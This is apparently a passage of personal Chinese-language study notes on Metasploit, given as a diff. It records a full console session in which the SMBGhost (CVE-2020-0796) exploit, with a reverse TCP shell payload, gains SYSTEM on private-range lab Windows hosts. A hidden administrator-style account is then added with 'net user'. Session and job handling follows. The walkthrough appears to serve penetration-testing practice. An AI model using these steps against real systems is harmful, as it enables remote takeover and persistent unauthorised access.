@@ -2908,3 +2908,290 @@ Microsoft Windows [_ 10.0.18362.476]
           
 
 C:\Windows\system32>
+
+即可拿到windows命令行终端
+
+
+再来一遍精简的
+┌──(root💀tyza66)-[~]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: View all productivity tips with the tips command
+                                                  
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.                ##########
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:                                
+                                :::::::+:
+                      Metasploit
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/windows/smb/cve_2020_0796_smbghost
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > show options
+
+Module options (exploit/windows/smb/cve_2020_0796_smbghost):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.
+                                      metasploit.com/docs/using-metasploit/
+                                      basics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
+                                        thread, process, none)
+   LHOST     192.168.101.53   yes       The listen address (an interface ma
+                                        y be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 10 v1903-1909 x64
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set RHOSTS 192.168.101.105RHOSTS => 192.168.101.105
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set DefangedMode false
+DefangedMode => false
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.105:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.105:445 - The service is running, but could not be validated.
+[*] 192.168.101.105:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7ac8000f000
+[*] 192.168.101.105:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.105:445 - Found HAL heap at 0xfffff7ac80000000
+[*] 192.168.101.105:445 - Found PML4 self-reference entry at 0x01ea
+[*] 192.168.101.105:445 - Found hal!HalpInterruptController at 0xfffff7ac80001490
+[*] 192.168.101.105:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8045e4b7bb0
+[*] 192.168.101.105:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+
+[*] 192.168.101.105:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+[-] 192.168.101.105:445 - Exploit failed: The connection with (192.168.101.105:445) timed out.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > 
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > show options
+
+Module options (exploit/windows/smb/cve_2020_0796_smbghost):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.101.105  yes       The target host(s), see https://docs.
+                                      metasploit.com/docs/using-metasploit/
+                                      basics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
+                                        thread, process, none)
+   LHOST     192.168.101.53   yes       The listen address (an interface ma
+                                        y be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 10 v1903-1909 x64
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > show options
+
+Module options (exploit/windows/smb/cve_2020_0796_smbghost):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.101.105  yes       The target host(s), see https://docs.
+                                      metasploit.com/docs/using-metasploit/
+                                      basics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
+                                        thread, process, none)
+   LHOST     192.168.101.53   yes       The listen address (an interface ma
+                                        y be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 10 v1903-1909 x64
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.105:445 - Running automatic check ("set AutoCheck false" to disable)
+[-] 192.168.101.105:445 - Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.105:445 - Running automatic check ("set AutoCheck false" to disable)
+[-] 192.168.101.105:445 - Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set RHOSTS 192.168.101.106RHOSTS => 192.168.101.106
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.106:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.106:445 - The service is running, but could not be validated.
+[*] 192.168.101.106:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7edc000f000
+[*] 192.168.101.106:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.106:445 - Found HAL heap at 0xfffff7edc0000000
+[*] 192.168.101.106:445 - Found PML4 self-reference entry at 0x0100
+[*] 192.168.101.106:445 - Found hal!HalpInterruptController at 0xfffff7edc0001490
+[*] 192.168.101.106:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8045fab7bb0
+[*] 192.168.101.106:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+[*] Sending stage (336 bytes) to 192.168.101.106
+[*] Command shell session 1 opened (192.168.101.53:4444 -> 192.168.101.106:49704) at 2025-02-16 17:32:11 +0800
+[*] 192.168.101.106:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+
+
+Shell Banner:
+Microsoft Windows [_ 10.0.18362.476]
+-----
+          
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+修改编码 解决乱码
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+偷摸添加一个用户
+C:\Windows\system32>net user admin admin /add
+net user admin admin /add
+The command completed successfully.
+
+后台监听 还可以用run -j
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > [*] 192.168.101.107:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.107:445 - The service is running, but could not be validated.
+[*] 192.168.101.107:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7edc000f000
+[*] 192.168.101.107:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.107:445 - Found HAL heap at 0xfffff7edc0000000
+[*] 192.168.101.107:445 - Found PML4 self-reference entry at 0x0100
+[*] 192.168.101.107:445 - Found hal!HalpInterruptController at 0xfffff7edc0001490
+[*] 192.168.101.107:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8045fab7bb0
+[*] 192.168.101.107:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+[*] Sending stage (336 bytes) to 192.168.101.107
+[*] Command shell session 4 opened (192.168.101.53:4444 -> 192.168.101.107:49760) at 2025-02-16 18:09:56 +0800
+[*] 192.168.101.107:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+
+这时候按回车就行了
+使用sessions就可以查看后台会话
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information            Connection
+  --  ----  ----               -----------            ----------
+  4         shell x64/windows  Shell Banner: Microso  192.168.101.53:4444 -
+                               ft Windows [_ 10.0.18  > 192.168.101.107:497
+                               362.476] (c) 2019 Mic  60 (192.168.101.107)
+                               rosoft Corpor...
+
+使用sessions -i 会话id  就可以进入会话
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > sessions -i 4
+[*] Starting interaction with 4...
+
+
+Shell Banner:
+Microsoft Windows [_ 10.0.18362.476]
+(c) 2019 Microsoft Corporation_
+
+C:\Windows\system32>
+-----
+          
+Z0i1FFtqiq4
+
+C:\Windows\system32>
+C:\Windows\system32>
+
+
+如果想回到后台且不关闭会话
+C:\Windows\system32>background
+
+Background session 4? [y/N]  y
+
+如果起不来并且提示地址已经使用了
+使用jobs命令查看正在运行的任务
+使用jobs -K 将后台任务全部清除掉
+
+普通启动的时候也可以background将会话保存到后台
+
+如果我想结束指定的会话就session -k 5 结束指定id的会话
+session -K 结束后台所有会话
+
+
+接下来打一下linux靶机
+下载好靶机
+
+
